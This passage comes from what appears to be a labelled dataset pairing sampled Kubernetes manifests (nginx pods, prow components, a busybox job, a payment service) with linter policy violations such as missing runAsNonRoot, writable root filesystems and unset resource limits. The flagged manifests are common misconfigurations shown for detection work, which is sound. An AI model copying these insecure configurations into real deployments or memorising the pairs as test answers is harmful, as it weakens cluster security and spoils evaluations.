    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: node-exporter\n  labels:\n    app: node-exporter\nspec:\n  selector:\n    matchLabels:\n      app: node-exporter\n  template:\n    metadata:\n      labels:\n        app: node-exporter\n    spec:\n      containers:\n      - name: node-exporter\n        image: quay.io/prometheus/node-exporter:v1.0.1\n        args:\n        - --web.listen-address=127.0.0.1:9100\n        - --path.procfs=/host/proc\n        - --path.sysfs=/host/sys\n        - --path.rootfs=/host/root\n        - --no-collector.wifi\n        - --no-collector.hwmon\n        volumeMounts:\n        - mountPath: /host/proc\n          mountPropagation: HostToContainer\n          name: proc\n          readOnly: true\n        - mountPath: /host/sys\n          mountPropagation: HostToContainer\n          name: sys\n          readOnly: true\n        - mountPath: /host/root\n          mountPropagation: HostToContainer\n          name: root\n          readOnly: true\n      volumes:\n      - name: proc\n        hostPath:\n          path: /proc\n      - name: sys\n        hostPath:\n          path: /sys\n      - name: root\n        hostPath:\n          path: /\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"node-exporter\" has memory limit 0"
  },
  {
    "id": "2242",
    "manifest_path": "data/manifests/the_stack_sample/sample_0551.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  selector:\n    matchLabels:\n      app: sinker\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        image: gcr.io/k8s-prow/sinker:v20211206-64485af39f\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sinker\" does not have a read-only root file system"
  },
  {
    "id": "2243",
    "manifest_path": "data/manifests/the_stack_sample/sample_0551.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  selector:\n    matchLabels:\n      app: sinker\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        image: gcr.io/k8s-prow/sinker:v20211206-64485af39f\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"sinker\" not found"
  },
  {
    "id": "2244",
    "manifest_path": "data/manifests/the_stack_sample/sample_0551.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  selector:\n    matchLabels:\n      app: sinker\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        image: gcr.io/k8s-prow/sinker:v20211206-64485af39f\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sinker\" is not set to runAsNonRoot"
  },
  {
    "id": "2245",
    "manifest_path": "data/manifests/the_stack_sample/sample_0551.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  selector:\n    matchLabels:\n      app: sinker\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        image: gcr.io/k8s-prow/sinker:v20211206-64485af39f\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sinker\" has cpu request 0"
  },
  {
    "id": "2246",
    "manifest_path": "data/manifests/the_stack_sample/sample_0551.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  selector:\n    matchLabels:\n      app: sinker\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        image: gcr.io/k8s-prow/sinker:v20211206-64485af39f\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sinker\" has memory limit 0"
  },
  {
    "id": "2247",
    "manifest_path": "data/manifests/the_stack_sample/sample_0553.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-499\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2248",
    "manifest_path": "data/manifests/the_stack_sample/sample_0553.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-499\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "2249",
    "manifest_path": "data/manifests/the_stack_sample/sample_0553.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-499\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "2250",
    "manifest_path": "data/manifests/the_stack_sample/sample_0553.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-499\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "2251",
    "manifest_path": "data/manifests/the_stack_sample/sample_0553.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-499\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "2252",
    "manifest_path": "data/manifests/the_stack_sample/sample_0558.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: csi-scale-staticdemo-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: web-server\n    image: nginx\n    volumeMounts:\n    - name: mypvc\n      mountPath: /usr/share/nginx/html/scale\n    ports:\n    - containerPort: 80\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: scale-static-pvc\n      readOnly: false\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"web-server\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2253",
    "manifest_path": "data/manifests/the_stack_sample/sample_0558.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: csi-scale-staticdemo-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: web-server\n    image: nginx\n    volumeMounts:\n    - name: mypvc\n      mountPath: /usr/share/nginx/html/scale\n    ports:\n    - containerPort: 80\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: scale-static-pvc\n      readOnly: false\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"web-server\" does not have a read-only root file system"
  },
  {
    "id": "2254",
    "manifest_path": "data/manifests/the_stack_sample/sample_0558.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: csi-scale-staticdemo-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: web-server\n    image: nginx\n    volumeMounts:\n    - name: mypvc\n      mountPath: /usr/share/nginx/html/scale\n    ports:\n    - containerPort: 80\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: scale-static-pvc\n      readOnly: false\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"web-server\" is not set to runAsNonRoot"
  },
  {
    "id": "2255",
    "manifest_path": "data/manifests/the_stack_sample/sample_0558.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: csi-scale-staticdemo-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: web-server\n    image: nginx\n    volumeMounts:\n    - name: mypvc\n      mountPath: /usr/share/nginx/html/scale\n    ports:\n    - containerPort: 80\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: scale-static-pvc\n      readOnly: false\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"web-server\" has cpu request 0"
  },
  {
    "id": "2256",
    "manifest_path": "data/manifests/the_stack_sample/sample_0558.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: csi-scale-staticdemo-pod\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: web-server\n    image: nginx\n    volumeMounts:\n    - name: mypvc\n      mountPath: /usr/share/nginx/html/scale\n    ports:\n    - containerPort: 80\n  volumes:\n  - name: mypvc\n    persistentVolumeClaim:\n      claimName: scale-static-pvc\n      readOnly: false\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"web-server\" has memory limit 0"
  },
  {
    "id": "2257",
    "manifest_path": "data/manifests/the_stack_sample/sample_0559.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  annotations:\n    foo.com/duname: themes\n    foo.com/duversion: 3.5.103-20190925.1569388185230\n    foo.com/version: 3.5.103\n  labels:\n    app.kubernetes.io/name: themes\n    helm.sh/chart: themes-3.5.103\n  name: themes\nspec:\n  ports:\n  - name: http\n    port: 80\n    protocol: TCP\n    targetPort: http\n  selector:\n    app.kubernetes.io/name: themes\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/name:themes])"
  },
  {
    "id": "2258",
    "manifest_path": "data/manifests/the_stack_sample/sample_0560.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20201001-0240871903\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"crier\" does not have a read-only root file system"
  },
  {
    "id": "2259",
    "manifest_path": "data/manifests/the_stack_sample/sample_0560.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20201001-0240871903\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"crier\" not found"
  },
  {
    "id": "2260",
    "manifest_path": "data/manifests/the_stack_sample/sample_0560.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20201001-0240871903\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"crier\" is not set to runAsNonRoot"
  },
  {
    "id": "2261",
    "manifest_path": "data/manifests/the_stack_sample/sample_0560.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20201001-0240871903\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"crier\" has cpu request 0"
  },
  {
    "id": "2262",
    "manifest_path": "data/manifests/the_stack_sample/sample_0560.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20201001-0240871903\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"crier\" has memory limit 0"
  },
  {
    "id": "2263",
    "manifest_path": "data/manifests/the_stack_sample/sample_0562.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-716\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2264",
    "manifest_path": "data/manifests/the_stack_sample/sample_0562.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-716\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "2265",
    "manifest_path": "data/manifests/the_stack_sample/sample_0562.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-716\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "2266",
    "manifest_path": "data/manifests/the_stack_sample/sample_0562.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-716\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "2267",
    "manifest_path": "data/manifests/the_stack_sample/sample_0562.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-716\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "2268",
    "manifest_path": "data/manifests/the_stack_sample/sample_0563.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sampleapp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sampleapp\n  template:\n    metadata:\n      labels:\n        app: sampleapp\n    spec:\n      containers:\n      - name: sampleapp\n        image: k8sexamplesacr.azurecr.io/sampleapp\n        ports:\n        - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"sampleapp\" is using an invalid container image, \"k8sexamplesacr.azurecr.io/sampleapp\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2269",
    "manifest_path": "data/manifests/the_stack_sample/sample_0563.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sampleapp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sampleapp\n  template:\n    metadata:\n      labels:\n        app: sampleapp\n    spec:\n      containers:\n      - name: sampleapp\n        image: k8sexamplesacr.azurecr.io/sampleapp\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sampleapp\" does not have a read-only root file system"
  },
  {
    "id": "2270",
    "manifest_path": "data/manifests/the_stack_sample/sample_0563.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sampleapp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sampleapp\n  template:\n    metadata:\n      labels:\n        app: sampleapp\n    spec:\n      containers:\n      - name: sampleapp\n        image: k8sexamplesacr.azurecr.io/sampleapp\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sampleapp\" is not set to runAsNonRoot"
  },
  {
    "id": "2271",
    "manifest_path": "data/manifests/the_stack_sample/sample_0563.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sampleapp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sampleapp\n  template:\n    metadata:\n      labels:\n        app: sampleapp\n    spec:\n      containers:\n      - name: sampleapp\n        image: k8sexamplesacr.azurecr.io/sampleapp\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sampleapp\" has cpu request 0"
  },
  {
    "id": "2272",
    "manifest_path": "data/manifests/the_stack_sample/sample_0563.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sampleapp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sampleapp\n  template:\n    metadata:\n      labels:\n        app: sampleapp\n    spec:\n      containers:\n      - name: sampleapp\n        image: k8sexamplesacr.azurecr.io/sampleapp\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sampleapp\" has memory limit 0"
  },
  {
    "id": "2273",
    "manifest_path": "data/manifests/the_stack_sample/sample_0564.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fluid-copy-test\nspec:\n  template:\n    spec:\n      containers:\n      - name: busybox\n        image: busybox\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - set -x; time cp -r /data/hbase ./\n        volumeMounts:\n        - mountPath: /data\n          name: hbase-vol\n      volumes:\n      - name: hbase-vol\n        persistentVolumeClaim:\n          claimName: hbase\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "2274",
    "manifest_path": "data/manifests/the_stack_sample/sample_0564.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fluid-copy-test\nspec:\n  template:\n    spec:\n      containers:\n      - name: busybox\n        image: busybox\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - set -x; time cp -r /data/hbase ./\n        volumeMounts:\n        - mountPath: /data\n          name: hbase-vol\n      volumes:\n      - name: hbase-vol\n        persistentVolumeClaim:\n          claimName: hbase\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"busybox\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2275",
    "manifest_path": "data/manifests/the_stack_sample/sample_0564.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fluid-copy-test\nspec:\n  template:\n    spec:\n      containers:\n      - name: busybox\n        image: busybox\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - set -x; time cp -r /data/hbase ./\n        volumeMounts:\n        - mountPath: /data\n          name: hbase-vol\n      volumes:\n      - name: hbase-vol\n        persistentVolumeClaim:\n          claimName: hbase\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"busybox\" does not have a read-only root file system"
  },
  {
    "id": "2276",
    "manifest_path": "data/manifests/the_stack_sample/sample_0564.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fluid-copy-test\nspec:\n  template:\n    spec:\n      containers:\n      - name: busybox\n        image: busybox\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - set -x; time cp -r /data/hbase ./\n        volumeMounts:\n        - mountPath: /data\n          name: hbase-vol\n      volumes:\n      - name: hbase-vol\n        persistentVolumeClaim:\n          claimName: hbase\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"busybox\" is not set to runAsNonRoot"
  },
  {
    "id": "2277",
    "manifest_path": "data/manifests/the_stack_sample/sample_0564.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fluid-copy-test\nspec:\n  template:\n    spec:\n      containers:\n      - name: busybox\n        image: busybox\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - set -x; time cp -r /data/hbase ./\n        volumeMounts:\n        - mountPath: /data\n          name: hbase-vol\n      volumes:\n      - name: hbase-vol\n        persistentVolumeClaim:\n          claimName: hbase\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"busybox\" has cpu request 0"
  },
  {
    "id": "2278",
    "manifest_path": "data/manifests/the_stack_sample/sample_0564.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fluid-copy-test\nspec:\n  template:\n    spec:\n      containers:\n      - name: busybox\n        image: busybox\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - set -x; time cp -r /data/hbase ./\n        volumeMounts:\n        - mountPath: /data\n          name: hbase-vol\n      volumes:\n      - name: hbase-vol\n        persistentVolumeClaim:\n          claimName: hbase\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"busybox\" has memory limit 0"
  },
  {
    "id": "2279",
    "manifest_path": "data/manifests/the_stack_sample/sample_0566.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: tuntsov/hipster-payment:v0.0.2\n        env:\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "2280",
    "manifest_path": "data/manifests/the_stack_sample/sample_0566.yaml",
